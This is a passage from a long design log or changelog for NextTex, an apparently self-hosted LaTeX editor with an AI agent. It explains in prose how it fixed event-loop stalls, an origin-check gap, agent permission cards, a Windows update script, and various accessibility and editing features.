every file except the empty ones. `project_everything` marks the lot.

**None of the three sizes on the card matched what landed.** `size` is written
once, when the sharer first adopts a file, and never refreshed as the document
is edited, so the card was quoting a number from whenever the project was
first shared: 3 kB for a file that arrived at 957 bytes. It is measured from
the body that actually arrived. It is still the sender's line endings, which
is a real difference on Windows and is said on the card rather than fixed,
because the joiner's own newlines are the right thing to write.

### Everything the writer never sees is unbounded, and the loop pays for it

NextTex is one process with one event loop. Every autosave, every event stream
and every collaborator's socket goes through it, so anything synchronous in a
route is not slow for the person who asked: it is slow for everybody who
happens to be writing at the time. That is why none of these was ever
reported. They are all on the path of something nobody can see.

**The write route had no ceiling at all.** `text: str`, written atomically
with two fsyncs, hashed, compressed into a version and scanned three times,
every step on the loop. Forty megabytes measured at 1.61 seconds during which
nothing else on the install was answered, against a nine to eleven millisecond
baseline, and the file it produced could not then be opened, because the read
route refuses anything over ten megabytes. The same ceiling now applies at
both ends, and the write, the version and the edit note are threaded.
`_ingest` is not, because it folds into a pycrdt document.

**Uploading a paper ran two subprocesses inline.** One second of held loop for
one ordinary PDF, in a file where everything comparable was already threaded.

**Emptying the trash was an unbounded `rmtree` and a ledger walk on the loop.**

**And three things could be asked for from outside.** A frame header was
allowed to be sixty-four megabytes of JSON parsed on the loop before anything
had looked at what kind of frame it was; the transport's read had no timeout,
so a peer that declares a length and never sends the bytes held its buffer for
ever; and hashing a new password held the loop for the fifteen milliseconds
that hashing is deliberately expensive for.

Two are in the backlog rather than fixed, both with their measurement. Building
a session walks the project on the loop, and the fix is forbidden: a session
builds its pycrdt documents and those belong to the thread that built them. A
collaborator's settled edit records its version from inside the flush, and the
whole path benches at 3.39 ms against a 120 ms budget.

### What a request that goes wrong is told

Three answers a browser could not read.

A GET was exempt from the origin check before anything looked at the headers,
and `SameSite=Lax` does not separate ports, so a page on another port of
localhost is same-site with this one and its cookie travels: that page could
read a project's file list, its transcript, its papers and its settings, one
request at a time. `Sec-Fetch-Site` is read for every method now. A request
that sends no such header is still allowed, because that is curl, the
installer and the printed link, and a page cannot forge an absence.

The single-page catch-all is registered last and claimed everything no route
wanted, which is right for the app and wrong for the API: a typo in a path
answered 200 with the whole interface as its body, and the browser's error
path read that as success and tried to parse a page of HTML.

And a body FastAPI would not accept came back as a list of objects under
`detail`, which the one error path in `api.ts` renders as "[object Object]"
for what is nearly always a missing field.

Two more that are about telling the truth rather than about shape. Filing a
conversation away cleared the in-memory record before the rename that might
fail, so a rename that failed emptied the panel, reported success, and
appended the next thing said to the end of the old file. And the file watcher
retried in complete silence for the life of the process, so a project whose
watch could not start looked exactly like a project where nothing outside the
app ever changes.

### Three tools that leave this machine, and one that runs anything

The fence has three positions and the middle one is the interesting one. It
says: the work runs without asking, and two things still stop it, a write
outside the project and anything reaching the internet. Two of the tools it
was letting through were neither of those in name and both of them in fact.

Running a Python script the model wrote is more than any single shell command
could be, and it was fenced for that reason at the first position and silent
at the middle one, because the list of answers that hold a tool back named
four cases and the code that read the list named three. Searching the
literature, adding a reference by DOI and checking a bibliography against its
publishers all reach out over the network with terms taken from files that may
not be the writer's, and they went through without a card because they are the
app's own tools and the app's own tools were waved past as a class. The
README's page on what leaves this machine already listed all three, so the
promise was written down and not kept.

Each now has a card of its own that says what the query is and where it goes.
At the last position, where the writer has said to ask about nothing, they stay
silent, as everything does.

### Two sentences that agree read as a form letter

A permission card has a headline, the thing itself, and then up to two
sentences. They answer different questions. `consequence` says what will
happen if this is allowed. `reason` says why this app is stopping at a setting
where the writer asked it not to. On a network card at the middle position both
were answering the second one, in nearly the same words: "what it sends is
chosen from what the project's files say", above "what is sent and where it
goes are chosen from files that may not be yours". Two sentences that agree are
read as boilerplate and boilerplate is scrolled past, which is the opposite of
what a card asking for a decision needs. The reason wins there, because it is
the one answering the question the writer is actually asking, which is why this
stopped when they had said not to stop.

Beside it, the same card was drawing the rule it would remember in the
protocol's own vocabulary: `Bash:latexmk`, `write:/home/writer/papers/main.tex`.
That is a wire format, and the colon is doing work that only reads as work if
you already know the grammar. It says "shell commands starting with latexmk"
and "changing …/papers/main.tex" now. The whole rule is still in the row's
tooltip for anybody who wants it.

And of the two answers that remember something, only one would say what. "Allow
always" had a line that appeared on hover naming the rule; "For this
conversation", sitting right beside it and remembering the same rule for a
shorter time, had nothing. The difference between the two is the entire reason
there are two of them, so it is exactly what the line has to draw: the same
line now says "Remembers:" for one and "Until this conversation is cleared:"
for the other.

### A card that expired is not a card that was refused

A card left unanswered times out, and the turn goes on without the tool. What
the panel drew, and what the transcript wrote down, was "Denied". That is a
statement about a decision, and nobody made one. It matters most on the
transcript, which exists to be read months later as the account of what was
done to somebody's document: refused says the writer looked at this and said
no.

The timeout now announces itself, the card reads "Not answered", and the record
carries `expired` as a third decision beside allowed and refused. Answering a
card that has already expired is told so rather than silently doing nothing,
because from the writer's side those two look identical.

### One question, typed once, in every window

A question typed in one tab appeared only in that tab, because the bubble was
pushed by the composer that sent it rather than by the event that says a turn
started. Every other window learned a turn was running and had nothing to say
was running. Moving the bubble to the event alone would have made the writer's
own question appear a beat after they pressed Send, on a slow machine visibly
so, which is worse. So the composer still draws it immediately, marked
pending, and the event either adopts that bubble or pushes one of its own. The
tab that asked sees no delay and the others see the question.

### A turn that stops has to say so, whoever stopped it

Everything the panel does after a question is keyed on one event arriving, and
`interrupt` was the only path that reliably sent it. A turn cancelled any other
way, by the session reaper on eviction or by a shutdown, ended in silence: the
turn was over and the panel still said it was thinking, with a Stop button that
by then really was the no-op it is never allowed to be. Both remaining agents
say it now, exactly once however the turn ended, and the parity test cancels a
turn from outside to check.

Two smaller repairs to the same record. A tool row for the range rewrite said
"Rewrote what you selected", which is a claim about the writer: the tool takes
a line range and the model chooses it, so the row now says "Rewrote lines" and
names them. And an approval given silently by the middle position was writing
"Asked at this setting" into the audit trail as its reason, which is a sentence
about a card that was never put up.

### A hundred pixels of nothing beside a clipped sentence

The agent panel's header has one line saying what the agent is doing this
second, and a spacer whose only job is to push Stop to the right edge. Both
were flexible, so the browser split the free space between them evenly: the
line clipped at half the room it could have had, with the spacer sitting beside
it holding a hundred pixels of nothing. On a panel three hundred and twenty
pixels wide that is the difference between reading `Read chapters/02_theory.tex`
and reading `Read chapte…`. The spacer is only drawn when there is no activity
line, which is the only time anything needs pushing.

### Three commits, and the interface reporting the middle one

An install can be at three different places at once. The commit the running
process loaded, the commit the files on disk are at, and the commit the remote
is at. A Windows laptop was found holding exactly that: `b7b60f2` serving,
`96d2b46` on disk, `b6a300d` upstream, having fast-forwarded overnight without
restarting.

What the interface reported was the middle one, everywhere, because the
instance route answered `head` by running `git rev-parse HEAD` when it was
asked, and that reads the working tree. The footer then compared that same disk
commit against the remote and said the install was up to date. Everything the
writer could see agreed, and all of it was about a copy of the code that was
not running.

They are two fields now. `head` is read once, when the process starts, and
cannot move while it runs. `diskHead` is what the files say now. When they
differ the footer says so before it says anything about GitHub, because "up to
date" is true of the files and false of the program reading them, and it is the
program the writer is using.

### An update that did three of its four steps and said it was fine

`update.ps1`'s own synopsis promises pull, reinstall, rebuild, restart. Its
restart looked for a scheduled task, found none, printed "not running as a
scheduled task; restart it yourself", and exited zero. Registering a scheduled
task needs administrator and this installer is deliberately not run elevated,
so an ordinary Windows account gets a Startup-folder shortcut instead, which
means that branch is what most installs take. Every caller, including the
update footer watching from the page, read a half-finished update as a
finished one.

The same decision caused two more. Dependencies were being updated underneath
a running server, so pip could not delete the compiled extension the server had
mapped and left a `~ycrdt` directory behind in site-packages, one per update,
for the life of the install. And there was no log: the operation most likely to
leave a machine in a state its owner cannot explain wrote nothing to disk, while
the install beside it has written `install.log` from the beginning.

So the script stops the server before it touches the dependencies and starts it
again afterwards, on either install shape: the scheduled task if there is one,
the Startup shortcut if there is not, since the shortcut's target is what the
installer decided and launching it starts the server exactly the way logging in
would. When neither can be done it says which two things it looked for, gives
the command to run, names the log, and exits one. It sweeps up whatever earlier
updates left behind while nothing has those files open, and it writes
`update.log` beside `install.log` on both platforms.

Three more came from running it on that laptop for real, and the first is
the one worth remembering. The dependencies step wedged: pip sat for fifteen
minutes with no CPU, no sockets and no temporary directory, and the server was
already stopped, so the machine had no NextTex for that quarter of an hour. The
operator killed pip by hand, and the step printed "up to date" and the script
exited zero. Nothing had ever read `$LASTEXITCODE`, so a killed install and a
finished one were the same thing to it, which is the fault the restart branch
had just been rewritten to remove, one step to the left.

And the log was keeping the wrong half of the run. `Start-Transcript` records
what PowerShell writes and not what a program writes, so git, both pips and the
interface fetch each appeared in `update.log` as a single glyph: the console
said "Already up to date." and "interface downloaded" and the log, whose entire
purpose is diagnosing an update on a machine you cannot see, recorded neither.
Every program now runs through one wrapper that pipes its output through
`Write-Host`, which the transcript does keep, and that reads its exit code and
stops the run when it is not zero.

The third was the reason that machine's update check could not reach GitHub.
`gitrepo._environment()` builds git's environment from nothing, deliberately,
so that a writer's own git configuration cannot change what this app does, and
it passed five names. On Windows the socket stack will not initialise without
`SystemRoot`, so every lookup failed as "Could not resolve host" while a shell
on the same machine over the same URL worked perfectly. It was proved by
varying one name at a time against that builder: with `SystemRoot` the lookup
succeeds, with `SystemDrive` instead it fails. The docstring said the names
listed were "the ones that being absent actually breaks", which was true on
POSIX and needed a fifth.

Which process to stop is not the question it looks like. The shortcut runs
`.venv\Scripts\python.exe -u server\run.py`, and on an install whose
interpreter came from the Microsoft Store that process immediately re-execs
into the Store Python, so what holds the port is a child with a different
image and a different process id from the one the shortcut started. Stopping
by image name would stop the launcher, leave the child serving, and the start
afterwards would fail on the port being in use, which is the single line that
filled that laptop's `server.err.log` in September. Whoever owns the listening
socket is the server, by definition, and the port comes from the install's own
`config.json`, because a named instance derives its own from its name. The
waits are on the port rather than on the process for the same reason: started
is not serving.

### A flag that was accepted, documented, and ignored

`install.sh` has two modes: run from inside a checkout it installs that
checkout, piped from curl it makes one first. `--dir` and `NEXTTEX_DIR` are read
before the branch and used only in the second one. So somebody who ran the
installer from inside a checkout and asked for the install to go elsewhere got
their working copy reinstalled instead, its `.venv` brought up to date and its
`frontend/dist` replaced, with one line of banner reading "installing the
checkout at ..." that scans as a statement rather than as a correction.

Refused rather than honoured. The design is right: run from inside a checkout,
this installs that checkout. What was missing was saying so when the answer
disagrees with the question. Asking for the checkout it is standing in is still
fine, because that answer is redundant rather than wrong, and a script that
refuses a correct answer is worse than one that ignores it.

### Half the contrast, in the theme most people use

`--line`, `--pen-wash` and `--hint-wash` are mixtures: `color-mix` over
`--ink-3`, over `--pen`, over `--hint`. They were declared once, on bare
`:root`. A custom property whose value contains `var()` is substituted where
it is declared rather than where it is used, so all three computed against
the light palette's ink and were then inherited, already resolved, into the
block that gives the app's furniture the dark palette inside a light theme.

Every border, separator and drag handle in that furniture was therefore drawn
from the light ink on dark surfaces. The status strip's top border measured
1.44:1 against the 2.56:1 the same border has in a whole-dark theme, on the
identical background; the composer's separator, 1.32 against 2.34. Half the
contrast, in the theme the app opens in.

`.nx-theme-white` below already redeclares `--line` for exactly this reason,
with a note explaining the arithmetic. That it was needed there and not done
here is the whole finding, so the guard is structural rather than numeric:
every block that moves an ingredient has to move what is mixed from it, and
`contrast.test.ts` now walks the stylesheet and says so. It cannot measure
`color-mix` without a browser, and it does not need to.

### Five surfaces the accessibility sweep had never opened

The reason `nested-interactive` survived is in the sweep rather than in the
code. `a11y.spec.ts` visited the screens that are on arrival, and every one of
the surfaces the fault lived on needs a step first: an error to open the
drawer, a row's menu to reach history, a turn in flight to draw the agent
panel's working line. A sweep of what is already on screen is a sweep of the
easy half.

Opening all five changed the count in both directions. The fault, impact
serious, is on the diagnostics drawer and the history panel, and on the papers
panel, which nobody had listed. It is not on the download menu, which is a real
button opening a `role="menu"` of real buttons and has never been anything
else, and it is not on the agent panel as that panel stands now. One shape underneath the three that have it: an element carrying
`role="button"` with a real `<button>` inside it, so assistive technology is
told the outer element is one button and the inner control is either
unreachable or folded into that button's name.

The diagnostics row is a plain div with a real button over the part that says
what the error is and Fix beside it. The history row is the same shape, with
the version's own action stretched across the row and the naming control and
the menu layered above it. The papers panel's Stop was a `role="button"` span
inside the header button and is now a button beside it. The file tree needed
nothing, which is worth recording: a treeitem is not a role whose children are
presentational, so the button inside it was never the fault, and restructuring
it introduced `aria-required-children`, impact critical, before the sweep
caught that too.

### A control that cannot be used says so

The status strip's dot and label are a button, and in four of its seven states
it opens nothing. It was focusable in all seven, so somebody tabbing through
the editor stopped on it, pressed it, and got no answer and no reason. It is
disabled in those four now, which also means the accessibility sweep has to
earn its error before it can open the drawer.

### A menu only a mouse could open, walk or close

The spelling menu claimed `role="menu"`. A keyboard user met nothing at all.
Focus never entered it, so an arrow key moved the caret in the document behind
the backdrop while the menu stayed put over a page that was now scrolling
underneath it. Escape did nothing, because the dismissal was a pointer-only
backdrop. And it could not be opened from the keyboard in the first place.

That last part had a specific cause worth writing down. Shift-F10 and the Menu
key do reach the page, as a `contextmenu` event with no pointer behind it, and
Chromium reports its coordinates as 0, 0. Read literally that is the top left
corner of the window, so the menu opened at a negative offset inside the pane
and was drawn off screen: from the writing chair, the key did nothing at all.
A `contextmenu` with no coordinates is now anchored to the misspelled word the
caret is in, which is what the key means; Mod-. does the same, because
Shift-F10 is not on every keyboard and the Menu key is missing from most
laptops. Focus moves into the menu when it opens, the arrows and Home and End
walk it, and Escape closes it and gives the editor the caret back.

### Two roving tab stops that could name a row that is not there

The file tree is one tab stop and the arrow keys move inside it, which is the
right shape: forty files should not be forty tab presses. Which row carries it
was `focusPath ?? activePath ?? first`, and `focusPath` was written in four
places and cleared in none. The moment it named a path that no longer exists,
deleted, or renamed, since committing a rename rebuilds the tree without
touching it, the expression matched no row and **the tree had no tab stop at
all**. It could not be reached with Tab again until somebody clicked a row with
the mouse, which is the one thing the person this affects cannot do.

The candidates are tried in order against the rows actually on screen now, and
the first one present wins, so a stale preference is a preference that is
ignored rather than a rail that cannot be reached. The Sections panel below it
had the same fault with an index instead of a path: a heading number from a
long chapter left a three-heading file with no row carrying the stop. It is
clamped, and reset when the file changes.

### Two answers, and the destructive one was the emphasised one

The confirmation that ends a conversation drew `Start new` as the
ghost-button at `--ink` and `Keep this one` as `quiet` at `--ink-3`, which is
the ink section 19 gives to `\include` rows that cannot be chosen. So the app
drew the answer it recommends in the colour it uses for things you cannot
pick. They are swapped, and the safe one takes focus, because the default
answer to "shall I throw this away" is no.

Two smaller inconsistencies between neighbours, from the same sweep. The
permission popover marked the current position with a fill alone while the
model popover, one icon along the same strip, marks its selection with a
four-pixel dot as well; it has the dot now. And the Files header carries a
count, as the Sections header one row down always has: two panels in one stack
with the same header shape, one saying how much it is hiding and the other
saying nothing, is a difference a reader has to notice and then explain.

### The error drawer is fetched when something opens it

The drawer draws nothing until it has a height, and a session where every build
is clean never opens it. It joins the tutorial, the PDF pane, the share sheet
and the version panel in being fetched on the click that wants it, which is
what kept the entry chunk inside its budget while this run's fixes went in: 800
kilobytes is the budget, the fixes took it to 800.4, and moving the drawer out
brought it back to 796.

Revised, since the projects rail run: the join offer card, the list of
what a peer is offering before any of it is written, is fetched the same
way, on the join that answers. It is on screen only between that answer
and the writer's decision, nobody reaches it from a cold start, and its
2.8 kilobytes were the headroom the rail needed under the same budget.
`frontend/src/panes/JoinOfferCard.tsx` is the file.

### A drag handle the editor was painting over

Dragging the file rail's divider resized nothing and selected text in the
editor instead. Two sweep shots that should have differed did not: the rail sat
at the same 240 pixels in both, and the only change between the images was a
text selection, in both themes.

The visible divider is one pixel and what answers a press is a nine-pixel span
overhanging it, half into each neighbouring pane. The pane on one side is
CodeMirror, which paints its content in a later stacking context, so a press on
the overhanging half landed in the editor. The hit zone is lifted above it now,
and marked `select-none` for the other half of what those shots showed: with
the button down and the pointer travelling across a text layer, the browser
will still start a selection in whatever is under it unless told not to.

### Photographed at one and at two, used at one and a quarter

Every screen in this repository had been photographed at a device pixel ratio
of 1 or 2. A Windows laptop at 125 per cent scaling, which is the ordinary
default on a laptop of that class, renders at 1.25. The clarity work here is
specifically about whole-pixel alignment, gutters and hairlines, and a
fractional ratio is exactly where whole-pixel reasoning stops holding: a rule
that lands on a pixel boundary at 1 and at 2 lands between pixels at 1.25.

Both shot suites take the ratio from `NEXTTEX_SHOT_DPR` now and name the files
by it, so a sweep at 1.25 sits beside the sweep at 1 rather than overwriting
it.

### The front door, and the one line of it nobody could read

The sign-in page is server-rendered, because it has to draw before the bundle
is authorised, and it is written as a string. It had no `<html>` element at
all, so the browser synthesised one with no `lang` and a screen reader
announced the first page a new writer meets in whatever language their machine
happens to default to. `frontend/index.html` has carried `lang="en"` all along.

Its palette is a copy, written out by hand, because the built stylesheet's name
is content-hashed and this page has no way to look it up. The copy had drifted
in the way a copy does: the recovery command is `pre > code` on `--surround` at
twelve pixels, and `--ink-3` measures 4.16:1 there against the 4.5 that small
text needs. The app's own answer to that exact pairing was `.nx-on-surround`,
which stepped the dimmest ink up to `--ink-2` (gone since §44, when the last
small text left the surround), and it could not reach a page that cannot
import the stylesheet anyway. So the page carries `--ink-2` and uses it, and a
test now reads both of its `:root` blocks and asserts every value against
`styles.css`.

### The only control on the restart line did nothing

The line R-041 added says "Updated on disk to b998e19. Restart to run it", and
the control it carried was Reload, which is the right control for every other
state the update footer draws. On this one it is a dead end. The page comes
back from the same process, and `head` is read once when that process starts,
so the sentence that returns is byte for byte the one that was just read. The
laptop that found it pressed the button rather than only reading the source,
and photographed the before and the after as identical strings.

The control is a restart now: `POST /api/update/restart` leaves with the
supervisor's exit code, which is how the update path has always restarted, and
the page waits out the new process on the `boot` nonce exactly as it does after
an update. Where nothing would start NextTex again the route refuses with 409
and the footer draws no control at all, because there is nothing it could press
that would work; the sentence reads "Stop NextTex and start it again to run it"
instead. A button that does nothing is worse than no button, because the reader
who presses it learns nothing and concludes the state itself is wrong.

### git's own words, and the control they pushed off the strip

The unreachable-repository line puts the error git returned next to Try again,
and git's errors are paragraphs: a failed DNS lookup names the URL, the host
and the resolver. It wrapped to three rows and carried the control down and out
of the footer. The error is the least important thing on that line and the only
thing that can be any length, so it is what gives way: it truncates with the
full text on hover, the warning and the control keep their width, and the line
is one row whatever git said.

### History could answer one question and the other one had a route already

The panel answers "what did this file used to say". The other question a
writer has is "what did I change this afternoon", and the only way to ask it
was to open every file in turn and read each list. The route that answers it
across the project has existed the whole time, taking a limit and returning
every file's versions newest first, with no client wrapper and no caller.

Two questions, not two panels. The header carries the same two-way micro
toggle the preview footer uses for Scroll and Page, and the rows are the rows
that were already there: in the whole-project list each one also says which
file it belongs to, which is the only difference between the two shapes.
Choosing a row brings that file to the front and puts the panel back on This
file, because reading a version means being in the file it belongs to, and
from there the panel can answer everything else about it: restoring, naming,
downloading, comparing. The alternative was a second panel that could show a
version and do nothing with it.

The list is read on the way into the project view and again after a build,
which is the trigger the per-file list already uses: a build is the point at
which a session's typing has become versions.

Since the backlog run the list has a third shape of row. An edit made
outside NextTex while it is running, a `git pull`, another editor's save,
is a version now, and a pull touching forty files in one second would
have been forty rows saying the same thing. The versions one watcher tick
recorded share a stamp, the whole-project list folds them into one row,
the newest of them, that says "changed outside NextTex, 12 files" and
unfolds to name the files, and each name is the way into that file's own
list, where a version can be opened, named or restored. The folded row
itself offers neither naming nor comparing, because it stands for several
files and those verbs belong to one. A tick that touched one file is an
ordinary row.

### Every project anybody made was an article

`GET /api/templates` lists the directories under `nexttex/templates`, the
`POST /template` route takes the name of one, and `api.loadTemplate` has a
`name` parameter defaulting to `basic`. Both callers passed no name, the
listing route was never fetched, and there was one directory anyway. So the
whole mechanism existed and the answer to "what kind of document is this" was
always the same one.

There are four now: an article, a report in chapters, a talk and a letter.
They are named on screen by what they are rather than by what the directory is
called, because `beamer` is a word only a LaTeX writer knows and the people
this chooser is for are the ones who may not. A template the server lists and
this list does not name falls back to its own name, so an install carrying a
template of its own is offered it rather than hidden.

The chooser is on the create row, and it is hidden when there is only one
template, which is what an install with its templates trimmed looks like: a
control that asks a question with a single answer is worse than no control.
The template is written before the project opens, so a writer arrives in a
document rather than in an empty one that fills in a moment later, and a
template that fails to write does not lose the project that was just made: the
message says which of the two happened and the project still opens.

The report is the one that is a different shape rather than a different
preamble. Its chapters are separate files, because NextTex builds the document
that owns the file being typed in rather than the whole project, and that is
what makes a long report editable at all.

### One item on the menu, and it was the wrong one for the common case

An underlined word offered "Add to the dictionary" and nothing else. That is
the right answer for a surname, an acronym or a variable name, and the wrong
one for a typo, and a typo is what most underlines are. The one outcome nobody
wants from that menu is a typo added to the dictionary, which is what the menu
made easiest.

Up to four suggestions sit above it now, nearest first, worked out by edit
distance against the word list that is already loaded: the ninety-eight
kilobyte chunk is fetched the first time checking is switched on, so a
suggestion costs a few hundred set lookups rather than a download. Distance two
is searched only when distance one comes up short, because the work grows as
the square and this runs while a menu is opening. A suggestion arrives with the
shape of the word it replaces, so a sentence-initial `Recieve` is offered as
`Receive` rather than as something the writer then has to fix by hand. Edit
distance and not phonetics: a soundalike index would catch `fizix` and this
does not, but the mistakes people make while typing are transpositions,
doubled letters and dropped letters, and those are all one edit away.

A word that is nothing like anything in the list gets no suggestions, and then
the menu is exactly what it was, which is the case that item was written for.

The other half is the way back. `DELETE /dictionary` and its client wrapper
both existed and nothing called either, so a word added by a slip of the hand
was added for the life of the project: the underline was gone and there was no
way to ask for it back. The words are listed under the spelling switch in the
settings sheet, each with a way to forget it, and the list is absent entirely
until there is something in it, because an empty list under a switch is a
permanent reminder of a feature nobody has used yet in a sheet whose job is to
be quiet.

The editor holds the accepted list and the settings sheet edits it, and they
are in different trees, so the store carries a stamp that both watch. Without
it, forgetting a word left the underline off until the tab was reloaded, which
reads as the control not working.

### The panel that exists to make git reachable was hiding half of it

A project with no repository was shown one card, offering to back it up to
GitHub. A project with a repository and no remote was shown the same card. Two
different situations with one answer, and the answer was the one that needs an
account and a network, so the local half of version control was reachable only
from a terminal: the panel whose whole job is to put git in front of a writer
was the thing keeping it away.

The card asks the question the project is actually in. With no repository it
leads with "Keep versions here", which is one call to a route that has taken
`init` the whole time, and offers GitHub second and quietly. With a repository
and no remote it is the card it always was. The wording follows: git keeping a
record of the project as a whole is worth saying next to the per-file history
NextTex already keeps, because a writer who has one may not see why they want
the other.

### The number somebody emptying something actually wants

Emptying a file's version history said "Deleted 7 versions". The route answers
with the bytes it freed as well, and the interface dropped that half. A count
of versions says nothing about whether the thing was worth doing, which is the
question somebody clearing space is asking, so it says "Deleted 7 versions,
freeing 240 KB".

The other end of the same question is what it is holding before anybody
decides. `/history/size` had a client wrapper and no caller since it was
written; the figure sits in the history panel's header. Both go through one
formatter, moved out of the history panel where it was the only copy, because
two formatters eventually round the same number two ways on one screen.

### Two things the README promises without an agent, that only the agent could do

The README calls working with no agent "a real option, not a degraded one",
and then describes two things that were agent tools and nothing else. Adding
an entry by DOI went through the resolve route, which needs an unidentified
PDF from a folder scan to hang the DOI on, so a writer who simply had a DOI in
front of them had to acquire a paper first. Re-checking a bibliography against
the publishers was called from the agent's tool and from nowhere in the
interface at all. Both of the functions underneath were written and tested.

They are in the Papers section now, which is also why that section appears for
a project with a bibliography rather than only for one where a folder has been
read: a `.bib` file is a thing with two things to do to it, and the panel that
is about bibliographies was absent from every project that had not imported
one.

The DOI box reports what arrived, with the title, author and year, rather than
only that something did. The whole argument of this feature is that the entry
comes from the publisher and not from a model, and a writer can only act on
that if they can see what came back and compare it against the page in front
of them.

### Five keys for five things a mouse was the only way to do

The app's global keys were `Cmd-B`, `Cmd-S`, `Cmd-Enter`, `Cmd-Alt-A`,
`Cmd-Alt-P` and Escape, and the room left over was `Cmd-Alt` with anything
else, which is where these go. `Cmd-W`, `Cmd-T` and the numbers belong to the
browser and cannot be taken, and Cmd-Alt-Shift-T is what a browser uses for
its own reopen, which is the association worth borrowing rather than avoiding.

`Cmd-Alt-O` puts the caret in the file tree's filter row, unfolding the rail
if it is folded. Every piece of a quick-open was already built and none of
them had a key: the filter row, the search behind it, and Enter opening the
first match. The input claims the focus itself when it arrives rather than
being focused on a timer, because the shortcut also unfolds the rail and the
tree is unmounted while the rail is folded, so the element to focus may not
exist yet and the one that does may be thrown away a moment later.

`Cmd-Alt-[` and `Cmd-Alt-]` walk the tab strip, wrapping at both ends,
because the strip is a ring in the way a writer uses it: two or three files,
gone round and round. Stopping at the end would make the second press of a
repeated key do nothing, which reads as the key having failed. `Cmd-Alt-W`
closes the tab in front and `Cmd-Alt-Shift-T` brings back the last one closed,
capped at twenty, from a list `afterClosing` has always returned and both of
its callers threw away.

These two were the arrows first, and the arrows do not reach the browser on
either desktop this app is used on: GNOME binds `Ctrl-Alt-Left` and
`Ctrl-Alt-Right` to switching workspace and takes them before any window sees
them, and a Mac browser uses `Cmd-Alt-Left` and `Cmd-Alt-Right` for its own
previous and next tab. A headless browser has neither a window manager nor a
menu bar, so the browser test passed while the keys did nothing on the machine
the app runs on. The brackets are free on both, and `Cmd-[` and `Cmd-]` are
already back and forward in a browser, so the direction reads the same way
with Alt added. The lesson is the one the `Cmd-Alt-A` note above records and
this pass did not apply: a global shortcut has to be tried on a real desktop,
because the only thing a passing browser test proves about one is that the
page would have handled it.

`F8` and `Shift-F8` step through the errors, in the drawer's own order, and
open the drawer if it is shut: stepping to an error the writer cannot see is a
jump with no explanation beside it. The selection moved into the store for
this, because the key works from anywhere and the drawer is not always the
thing holding the keyboard.

### Everything else the error drawer would not do

A message could not be copied, though the one thing a writer does with an
error NextTex cannot explain is take it somewhere else. It was selectable text
inside a button, so selecting it opened the row and jumped the editor. There
is a Copy beside Fix, writing `file:line: message`.

A project previewing several documents had every document's diagnostics in one
flat list with nothing saying which was which. The store now tags each row with
the document whose build produced it, and the drawer offers a filter, but only
where it is a question: one previewed document is the ordinary case and a
filter with one option is furniture.

And the raw log was unreachable from the app entirely. `build/` is excluded
from the file tree, deliberately, so there was no route and no way to open the
file even though `.log` is a text kind the editor would draw. Section 7 of this
document rejects a bottom console with Problems, Output and Terminal tabs; the
log opens inside the diagnostic row it belongs to, in the place a few lines of
context already went, which is what keeping it reachable looks like without
one. The route reads the last two megabytes, because a run with a package
looping writes tens of them and the interesting part is the end.

### The two things a LaTeX writer types most did not close themselves

`closeBrackets()` was installed with its default set, `( [ { ' "`, which is a
sensible answer for a programming language and leaves out the character a
LaTeX writer types most after a letter. The set comes from the language's own
data rather than from the extension's options, so the answer belongs on the
language, which is also why there is now one `stex` instance rather than two: a
second `StreamLanguage.define(stex)` would be a different language and would
not carry it.

A `\begin{figure}` typed by hand never produced its `\end{figure}`. That
happened only when the completion list was used, which is the case where the
writer already knew the environment's name and needed the help least. Enter at
the end of a `\begin` line writes the block and leaves the caret on the line
between, indented to match, which is where they were going to type anyway.

Whether to write it is decided by counting `\begin{x}` against `\end{x}` in the
whole document. A rule that looked only below the caret cannot tell an unclosed
block from a closed one whose `\end` belongs to a block further up, and both of
those happen constantly while somebody writes a nested list. Counting rather
than parsing: an `\end` inside a comment or a verbatim block is miscounted, and
the cost of that is one closing line the writer deletes, against parsing the
buffer on every press of Enter. The count is asked for only once the line has
been recognised as opening a block, because reading the buffer out as a string
is a copy of the file and almost every Enter is pressed on a line that opens
nothing.

Pairing the dollar had one case it got wrong, which is the case a pairing rule
always gets wrong: `closeBrackets` decides by the character after the caret,
and after a price at the end of a sentence there is nothing there, so `\$100
in all.` came out with a stray closer on the end of it. A dollar with an odd
number of backslashes in front of it is a currency sign and is inserted plain;
`\\$x$` is a line break followed by real maths and still pairs, which is why
the run is counted rather than the one character read.

### A page number is the one coordinate a long document has

Next page, previous page and the arrow keys were all gated on the page mode,
so a reader in the scrolling one had no way to reach page 74 of a thesis
except by dragging, and the readout was never an input in either. Which mode
somebody is reading in has nothing to do with whether they can name a page.
The steppers and a number box are in the footer in both modes now, and in
scroll mode naming a page scrolls its container to the top of the view rather
than setting a state of its own: the scroll handler then works out which page
that is, so there is one answer to "which page is this" instead of two that
can disagree.

The zoom is remembered beside the mode, which has been remembered all along. A
reader who works at 140 percent because of their eyes or their screen was
setting it again every session.

And the footer has a Save, for the page that is already rendered and already
on disk. The only other way to it is the header's download menu, whose PDF
item forces a full server rebuild first, which is a wait for a file the reader
is looking at. It drops at narrow widths like everything else on that strip,
because it is a 26px band and a second line of it is clipped by definition.

### A word count that says what it counted

Two scopes, and the two a writer asks about most are neither of them: how long
is this selection, and how long is the section I am in. The scope was also
plain `useState`, so somebody who counts their chapter chose it again every
session.

Four scopes now, cycled by the same click, remembered between sessions, and
the strip says which one it is showing rather than leaving the number to be
interpreted. Selection is offered only when there is one, because a scope that
counts nothing is a stop on the cycle that reads as the control being broken.

They are all counted by texcount, over a range of lines the server slices out,
rather than by a regular expression in the browser. That was the tempting
version and it is wrong: counting a `.tex` file with a regular expression
counts control sequences and maths as prose, which is the reason texcount is
here at all, and a second counter disagreeing with the first by a few percent
on the same prose leaves the writer with no way to tell which number is the
one their supervisor will get. The slice is written into the build directory,
which is already out of the tree, the watcher and every walk, so a temporary
file there cannot appear in front of anybody, and it is removed whether the
count succeeded or not.

Going through a subprocess is what makes the count's dependencies matter. The
section and selection spans are computed from the outline, the cursor line,
the line count and the selection, and putting those four in the effect's
dependencies ran texcount on every arrow key, in every scope, including the
two that have no span to compute. What the count depends on is the span, so
the span is computed once and memoised and the effect depends on its two
numbers: a document count now asks the server exactly when the document is
built, and a section count when the caret crosses a heading. A selection is
written to the store as it is dragged, which is right for everything else in
the strip and would be a subprocess per frame here, so that one scope waits
400 ms for the drag to settle, the same pause the cursor sync uses.

### Find in one file, and find in all of them

The editor has had CodeMirror's find and replace since the first week, and it
searches the file in front of you. There was nothing at all across the
project, so renaming a label or swapping `\cite` for `\citep` meant opening
every chapter and pressing Ctrl-F in each of them, and the writer's own memory
of which chapters they had done was the only record of progress.
